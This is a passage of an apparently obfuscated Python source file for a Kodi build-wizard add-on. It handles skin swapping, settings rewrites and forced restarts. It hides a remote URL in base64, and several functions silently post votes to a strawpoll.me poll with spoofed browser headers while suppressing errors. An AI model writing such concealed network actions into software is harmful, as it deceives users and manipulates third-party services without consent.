# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
import platform #line:31
from shutil import copyfile #line:32
try :from sqlite3 import dbapi2 as database #line:33
except :from pysqlite2 import dbapi2 as database #line:34
from threading import Thread #line:35
from datetime import date ,datetime ,timedelta #line:36
from urlparse import urljoin #line:37
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:38
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
DP2 =xbmcgui .DialogProgressBG ()#line:67
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 =''#line:253
IPTVSIMPL18PC =''#line:254
oo ='/key.xml'#line:260
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OOO0O0OOOO0OO00O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	O0OOOOO000O0O000O =[];O0000O00OO0000000 =[]#line:267
	for OO00000O00000OO0O in sorted (OOO0O0OOOO0OO00O0 ,key =lambda OO0O0OO0OO0OOOO00 :OO0O0OO0OO0OOOO00 ):#line:268
		O000O0OO00OOOO00O =os .path .split (OO00000O00000OO0O [:-1 ])[1 ]#line:269
		O0OOOOOOO000O00OO =os .path .join (OO00000O00000OO0O ,'addon.xml')#line:270
		if os .path .exists (O0OOOOOOO000O00OO ):#line:271
			O000O00OOO0O00O00 =open (O0OOOOOOO000O00OO )#line:272
			O00O00O0OO0OOO000 =O000O00OOO0O00O00 .read ()#line:273
			OO0OO00O00O0O0O00 =parseDOM2 (O00O00O0OO0OOO000 ,'addon',ret ='id')#line:274
			OOOO000000OO0OOOO =O000O0OO00OOOO00O if len (OO0OO00O00O0O0O00 )==0 else OO0OO00O00O0O0O00 [0 ]#line:275
			try :#line:276
				OOOO0000000OO0000 =xbmcaddon .Addon (id =OOOO000000OO0OOOO )#line:277
				O0OOOOO000O0O000O .append (OOOO0000000OO0000 .getAddonInfo ('name'))#line:278
				O0000O00OO0000000 .append (OOOO000000OO0OOOO )#line:279
			except :#line:280
				pass #line:281
	O000OO0O00O000000 =[];O000O000OO0000O0O =0 #line:282
	OO0O0OOOO00OOOOOO =["Current Skin -- %s"%currSkin ()]+O0OOOOO000O0O000O #line:283
	O000O000OO0000O0O =DIALOG .select ("Select the Skin you want to swap with.",OO0O0OOOO00OOOOOO )#line:284
	if O000O000OO0000O0O ==-1 :return #line:285
	else :#line:286
		OOOOO0OO00O00O00O =(O000O000OO0000O0O -1 )#line:287
		O000OO0O00O000000 .append (OOOOO0OO00O00O00O )#line:288
		OO0O0OOOO00OOOOOO [O000O000OO0000O0O ]="%s"%(O0OOOOO000O0O000O [OOOOO0OO00O00O00O ])#line:289
	if O000OO0O00O000000 ==None :return #line:290
	for OO00O00OO0OO000OO in O000OO0O00O000000 :#line:291
		swapSkins (O0000O00OO0000000 [OO00O00OO0OO000OO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0OOO0OOO00O0OOOO ,title ="Error"):#line:296
	OO0OO00OO0O0OO000 ='lookandfeel.skin'#line:297
	O00O00O0OOO0O0O00 =O0OOO0OOO00O0OOOO #line:298
	OO000000O0O0OO000 =getOld (OO0OO00OO0O0OO000 )#line:299
	O0000O0O0OOO0O000 =OO0OO00OO0O0OO000 #line:300
	setNew (O0000O0O0OOO0O000 ,O00O00O0OOO0O0O00 )#line:301
	OOO00OOOO00OO0O0O =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00OOOO00OO0O0O <100 :#line:303
		OOO00OOOO00OO0O0O +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OOO0OO00O0000OO0O ):#line:310
	try :#line:311
		OOO0OO00O0000OO0O ='"%s"'%OOO0OO00O0000OO0O #line:312
		OOO0O0OOOO0OO0O0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO0OO00O0000OO0O )#line:313
		O000OO00OOO0O00OO =xbmc .executeJSONRPC (OOO0O0OOOO0OO0O0O )#line:315
		O000OO00OOO0O00OO =simplejson .loads (O000OO00OOO0O00OO )#line:316
		if O000OO00OOO0O00OO .has_key ('result'):#line:317
			if O000OO00OOO0O00OO ['result'].has_key ('value'):#line:318
				return O000OO00OOO0O00OO ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OO0O000O0O0OO00OO ,OO0OO0OO00O00OOOO ):#line:325
	try :#line:326
		OO0O000O0O0OO00OO ='"%s"'%OO0O000O0O0OO00OO #line:327
		OO0OO0OO00O00OOOO ='"%s"'%OO0OO0OO00O00OOOO #line:328
		O0OOOO0000O0O000O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O000O0O0OO00OO ,OO0OO0OO00O00OOOO )#line:329
		O0O00OO0OOOOOO00O =xbmc .executeJSONRPC (O0OOOO0000O0O000O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OOOOO0O0O0OO0O000 =xbmcgui .DialogProgress ()#line:340
			OOOOO0O0O0OO0O000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OOOOO0O0O0OO0O000 .update (0 )#line:344
			for OO0OO0O00OOO00OO0 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OOOOO0O0O0OO0O000 .update (int ((5 -OO0OO0O00OOO00OO0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0OO0O00OOO00OO0 ),'')#line:347
				if OOOOO0O0O0OO0O000 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OOOOO0O0O0OO0O000 =xbmcgui .DialogProgress ()#line:353
			OOOOO0O0O0OO0O000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OOOOO0O0O0OO0O000 .update (0 )#line:357
			for OO0OO0O00OOO00OO0 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OOOOO0O0O0OO0O000 .update (int ((5 -OO0OO0O00OOO00OO0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0OO0O00OOO00OO0 ),'')#line:360
				if OOOOO0O0O0OO0O000 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
    if KODIV >=17 and KODIV <18 :#line:367
        O00O00OOOO0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")#line:368
        O0OOO00O000O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:369
        copyfile (O00O00OOOO0OO0OOO ,O0OOO00O000O00OO0 )#line:370
        O00O00OOOO0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:372
        O0OOO00O000O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:373
        copyfile (O00O00OOOO0OO0OOO ,O0OOO00O000O00OO0 )#line:375
        os ._exit (1 )#line:376
    if KODIV >=18 :#line:378
        O00O00OOOO0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")#line:379
        O0OOO00O000O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:380
        copyfile (O00O00OOOO0OO0OOO ,O0OOO00O000O00OO0 )#line:381
        O00O00OOOO0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")#line:382
        O0OOO00O000O00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")#line:383
        copyfile (O00O00OOOO0OO0OOO ,O0OOO00O000O00OO0 )#line:385
        os ._exit (1 )#line:386
def testcommand1 ():#line:389
    import requests #line:390
    O0OOOO0O0O0OOO0OO ='18773068'#line:391
    OO0O0000000O0O0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOOO0O0O0OOO0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:403
    O00O0OOOOOO0000OO ='145273320'#line:405
    OO0O00O0OO00OOO0O ='145272688'#line:406
    if ADDON .getSetting ("auto_rd")=='true':#line:407
        OOOO00O000O0000OO =O00O0OOOOOO0000OO #line:408
    else :#line:409
        OOOO00O000O0000OO =OO0O00O0OO00OOO0O #line:410
    OOOO0O0O0OOOOOOO0 ={'options':OOOO00O000O0000OO }#line:414
    O00OOOOO0OOO0O0O0 =requests .post ('https://www.strawpoll.me/'+O0OOOO0O0O0OOO0OO ,headers =OO0O0000000O0O0OO ,data =OOOO0O0O0OOOOOOO0 )#line:416
def builde_Votes ():#line:417
   try :#line:418
        import requests #line:419
        OO000000O00O000O0 ='18773068'#line:420
        O0OO0OO00O00OOOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO000000O00O000O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:432
        OOOOOOO00OOOOO00O ='145273320'#line:434
        OOOOOOOO0OOOOOOOO ={'options':OOOOOOO00OOOOO00O }#line:440
        O0OOO00O000OOOOOO =requests .post ('https://www.strawpoll.me/'+OO000000O00O000O0 ,headers =O0OO0OO00O00OOOO0 ,data =OOOOOOOO0OOOOOOOO )#line:442
   except :pass #line:443
def update_Votes ():#line:444
   try :#line:445
        import requests #line:446
        OO00O0O0O00O0OO00 ='18773068'#line:447
        O0OO0OOOO0O000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00O0O0O00O0OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:459
        O00O000O0O00OO0O0 ='145273321'#line:461
        OOO00OO00O000O00O ={'options':O00O000O0O00OO0O0 }#line:467
        OOOO00O0000OOOOOO =requests .post ('https://www.strawpoll.me/'+OO00O0O0O00O0OO00 ,headers =O0OO0OOOO0O000O0O ,data =OOO00OO00O000O00O )#line:469
   except :pass #line:470
def kodi17to18 ():#line:473
  if KODIV >=18 :#line:475
    O0OO0OOOOO00O0OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:477
    with open (O0OO0OOOOO00O0OO0 ,'r')as OOO00OO0OO00O00OO :#line:478
      O00OO00O0OO0000OO =OOO00OO0OO00O00OO .read ()#line:479
    O00OO00O0OO0000OO =O00OO00O0OO0000OO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:526
    with open (O0OO0OOOOO00O0OO0 ,'w')as OOO00OO0OO00O00OO :#line:529
      OOO00OO0OO00O00OO .write (O00OO00O0OO0000OO )#line:530
    O0OO0OOOOO00O0OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:536
    with open (O0OO0OOOOO00O0OO0 ,'r')as OOO00OO0OO00O00OO :#line:537
      O00OO00O0OO0000OO =OOO00OO0OO00O00OO .read ()#line:538
    O00OO00O0OO0000OO =O00OO00O0OO0000OO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
